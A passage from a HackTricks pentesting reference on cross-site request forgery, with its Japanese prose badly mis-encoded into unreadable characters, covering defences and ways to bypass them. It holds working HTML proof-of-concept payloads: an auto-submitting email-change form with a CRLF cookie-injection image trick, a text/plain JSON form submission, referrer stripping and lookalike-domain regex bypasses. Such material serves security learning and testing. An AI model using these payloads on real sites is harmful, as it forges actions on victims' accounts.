# CSRFï¼ˆã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## CSRFã¨ã¯ï¼Ÿ

**ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒª**ï¼ˆCSRFï¼‰ã¯ã€ã‚¦ã‚§ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã¯ã€**ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŒæ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãã“ã‹ã‚‰æ‚ªæ„ã®ã‚ã‚‹JSã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã—ãŸã‚Šã€"ç”»åƒ"ã‚’**è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã«å–å¾—ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã¾ã™ã€‚

### å¿…è¦æ¡ä»¶

CSRFã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€ã¾ãš**æ‚ªç”¨ã™ã‚‹é‡è¦ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚„ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¤‰æ›´ã€è¢«å®³è€…ã‚’ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§ãƒ•ã‚©ãƒ­ãƒ¼ã•ã›ã‚‹ã€ã‚ˆã‚Šå¤šãã®ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ãªã©ï¼‰ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯**ã‚¯ãƒƒã‚­ãƒ¼ã¾ãŸã¯HTTPãƒ™ãƒ¼ã‚·ãƒƒã‚¯èªè¨¼ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã®ã¿ä¾å­˜**ã—ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã€ä»–ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å‡¦ç†ã«ä½¿ç”¨ã§ãã¾ã›ã‚“ã€‚ãã—ã¦ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«**äºˆæ¸¬ä¸å¯èƒ½ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ãŒãªã„**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã¯ã€ã„ãã¤ã‹ã®**å¯¾ç­–**ãŒå–ã‚‰ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### **ä¸€èˆ¬çš„ãªé˜²å¾¡ç­–**

* [**SameSiteã‚¯ãƒƒã‚­ãƒ¼**](hacking-with-cookies/#samesite): ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ãŒã“ã®ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ä»»æ„ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰ã‚¯ãƒƒã‚­ãƒ¼ã‚’é€ä¿¡ã§ããªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚
* [**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚½ãƒ¼ã‚¹å…±æœ‰**](cors-bypass.md): é–¢é€£ã™ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ç¨®é¡ã«å¿œã˜ã¦ã€è¢«å®³è€…ã‚µã‚¤ãƒˆã®**CORSãƒãƒªã‚·ãƒ¼**ã‚’è€ƒæ…®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚_CORSãƒãƒªã‚·ãƒ¼ã¯ã€å˜ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¾ãŸã¯ãƒ•ã‚©ãƒ¼ãƒ ã‹ã‚‰ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€å¿œç­”ã‚’èª­ã¿å–ã‚‹å¿…è¦ãŒãªã„å ´åˆã«ã¯å½±éŸ¿ã—ã¾ã›ã‚“ã€‚_
* **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã™ã‚‹ã‚ˆã†ã«è¦æ±‚ã™ã‚‹ã€‚
* **ã‚­ãƒ£ãƒ—ãƒãƒ£**ã‚’è§£æ±ºã™ã‚‹
* **ãƒªãƒ•ã‚¡ãƒ©**ã¾ãŸã¯**ã‚ªãƒªã‚¸ãƒ³**ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’èª­ã‚€ã€‚æ­£è¦è¡¨ç¾ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ã€‚
* http://mal.net?orig=http://example.comï¼ˆURLã§çµ‚ã‚ã‚‹ï¼‰
* http://example.com.mal.netï¼ˆURLã§å§‹ã¾ã‚‹ï¼‰
* POSTã¾ãŸã¯GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã®**åå‰**ã‚’**å¤‰æ›´**ã™ã‚‹
* å„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ã‚’ä½¿ç”¨ã™ã‚‹ã€‚ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã«é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯CORSã§ä¿è­·ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### CSRFãƒãƒƒãƒ—

![](<../.gitbook/assets/image (112).png>)

## é˜²å¾¡ãƒã‚¤ãƒ‘ã‚¹

### POSTã‹ã‚‰GETã¸

æ‚ªç”¨ã—ãŸã„ãƒ•ã‚©ãƒ¼ãƒ ãŒ**CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æº–å‚™ãŒã§ãã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ãŒã€**GET**ã‚‚**æœ‰åŠ¹**ã§ã‚ã‚Šã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã¨ãã«**CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒå¼•ãç¶šãæ¤œè¨¼ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒˆãƒ¼ã‚¯ãƒ³ã®æ¬ å¦‚

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«æ­£ã—ã**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼**ã—ã¾ã™ãŒã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒæ¬ è½ã—ã¦ã„ã‚‹å ´åˆã«ã¯æ¤œè¨¼ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼å…¨ä½“ã‚’ï¼ˆå€¤ã ã‘ã§ãªãï¼‰å‰Šé™¤ã—ã¦æ¤œè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã€CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨åŒã˜ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒå±ã—ã¦ã„ã‚‹ã“ã¨ã‚’**æ¤œè¨¼ã—ãªã„**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä»£ã‚ã‚Šã«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ç™ºè¡Œã—ãŸãƒˆãƒ¼ã‚¯ãƒ³ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ¼ãƒ«ã‚’ç¶­æŒã—ã€ã“ã®ãƒ—ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å—ã‘å…¥ã‚Œã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯è‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã€æœ‰åŠ¹ãªãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’CSRFæ”»æ’ƒã®è¢«å®³è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æä¾›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ¡ã‚½ãƒƒãƒ‰ãƒã‚¤ãƒ‘ã‚¹

ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒã€Œ**å¥‡å¦™ãª**ã€**ãƒ¡ã‚½ãƒƒãƒ‰**ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**ãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰æ©Ÿèƒ½**ãŒæ©Ÿèƒ½ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚\
ãŸã¨ãˆã°ã€**PUT**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**POST**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦æ¬¡ã®ã‚ˆã†ã«é€ä¿¡ã§ãã¾ã™ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

ã“ã‚Œã¯ã€**\_methodãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‚’POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã«é€ä¿¡**ã™ã‚‹ã‹ã€**ãƒ˜ãƒƒãƒ€ãƒ¼**ã‚’ä½¿ç”¨ã—ã¦ã‚‚æ©Ÿèƒ½ã—ã¾ã™ã€‚

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒã‚¤ãƒ‘ã‚¹

ã‚‚ã—ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒ**CSRFä¿è­·æ‰‹æ³•**ã¨ã—ã¦**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’å«ã‚€**ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼**ã‚’è¿½åŠ ã—ã¦ã„ã‚‹å ´åˆã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š

* **ã‚«ã‚¹ã‚¿ãƒ ãƒˆãƒ¼ã‚¯ãƒ³ã¨ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å«ã¾ãªã„**çŠ¶æ…‹ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚
* **åŒã˜é•·ã•**ã§ã™ãŒ**ç•°ãªã‚‹ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚¯ãƒƒã‚­ãƒ¼ã§æ¤œè¨¼ã•ã‚Œã¾ã™

å‰è¿°ã®è„†å¼±æ€§ã®ã•ã‚‰ãªã‚‹ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã—ã¦ã€ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯**ã‚¯ãƒƒã‚­ãƒ¼ã¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã®ä¸¡æ–¹ã«åŒã˜ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¤‡è£½**ã—ã¾ã™ã€‚ã¾ãŸã¯ã€**CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®š**ã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§**ã‚¯ãƒƒã‚­ãƒ¼ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒé€ä¿¡ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã¨ä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯**ã—ã¾ã™ã€‚

æ¬¡ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ¤œè¨¼ã•ã‚Œã‚‹éš›ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯å˜ç´”ã«**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã«é€ä¿¡ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒƒã‚­ãƒ¼ã«ä¿å­˜ã•ã‚ŒãŸå€¤ã¨ä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã—ã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯å†ã³CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€çŠ ç‰²è€…ã«CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã‚‹è„†å¼±æ€§ãŒã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«å­˜åœ¨ã™ã‚‹å ´åˆã€CRLFã®ã‚ˆã†ãªå½¢ã§æ”»æ’ƒã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®å ´åˆã€å½ã®ç”»åƒã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã‚’è©¦ã¿ã¦ã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã—ã€æ¬¡ã«ã“ã®ä¾‹ã®ã‚ˆã†ã«CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**csrfãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã‚‹å ´åˆã€ã“ã®æ”»æ’ƒã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ãªãœãªã‚‰ã€è¢«å®³è€…ã«è‡ªåˆ†ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã—ãŸãŒã£ã¦è‡ªåˆ†è‡ªèº«ã‚’æ”»æ’ƒã™ã‚‹ã“ã¨ã«ãªã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

### Content-Typeã®å¤‰æ›´

[**ã“ã¡ã‚‰**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ã«ã‚ˆã‚‹ã¨ã€**ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆã‚’å›é¿**ã™ã‚‹ãŸã‚ã«ã€**POST**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€æ¬¡ã®Content-Typeã®å€¤ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã™ã€‚

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ãŸã ã—ã€ä½¿ç”¨ã™ã‚‹**Content-Type**ã«ã‚ˆã£ã¦ã¯ã€**ã‚µãƒ¼ãƒãƒ¼ã®ãƒ­ã‚¸ãƒƒã‚¯ãŒç•°ãªã‚‹å ´åˆãŒã‚ã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€ä¸Šè¨˜ã®å€¤ã‚„**`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ãªã©ã€ä»–ã®å€¤ã‚‚è©¦ã—ã¦ã¿ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

[ã“ã“](https://brycec.me/posts/corctf\_2021\_challenges)ã‹ã‚‰ã®ä¾‹ï¼šJSONãƒ‡ãƒ¼ã‚¿ã‚’text/plainã¨ã—ã¦é€ä¿¡ã™ã‚‹å ´åˆï¼š
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/json preflight request bypass

æ—¢ã«ãŠçŸ¥ã‚Šã®é€šã‚Šã€HTMLãƒ•ã‚©ãƒ¼ãƒ ã‚’ä»‹ã—ã¦Content-TypeãŒ**`application/json`**ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã¾ãŸã€**`XMLHttpRequest`**ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€æœ€åˆã«**preflight**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚\
ãŸã ã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒContent-Typeã«é–¢ä¿‚ãªããƒ‡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€JSONãƒ‡ãƒ¼ã‚¿ã‚’content types **`text/plain`** ãŠã‚ˆã³ **`application/x-www-form-urlencoded`** ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
`Content-Type: text/plain`ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**`enctype="text/plain"`**ã‚’è¨­å®šã—ã¾ã™ã€‚

ã‚µãƒ¼ãƒãƒ¼ãŒã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ— "application/json" ã®ã¿ã‚’å—ã‘å…¥ã‚Œã‚‹å ´åˆã€preflightãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã›ãšã«**ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ— "text/plain; application/json"**ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€**SWFãƒ•ãƒ©ãƒƒã‚·ãƒ¥ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’ä½¿ç”¨ã—ã¦ã“ã®åˆ¶é™ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã‚’èª­ã‚“ã§ãã ã•ã„ã€‚

### Referrer / Origin check bypass

**Refererãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å›é¿ã™ã‚‹**

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«Refererãƒ˜ãƒƒãƒ€ãƒ¼ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«ã®ã¿ã€ãã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ¤œè¨¼ã—ã¾ã™ãŒã€ãƒ˜ãƒƒãƒ€ãƒ¼ãŒçœç•¥ã•ã‚ŒãŸå ´åˆã¯æ¤œè¨¼ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚
```markup
<meta name="referrer" content="never">
```
**æ­£è¦è¡¨ç¾ã®ãƒã‚¤ãƒ‘ã‚¹**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

ReferrerãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã§é€ä¿¡ã™ã‚‹URLã®ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’è¨­å®šã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
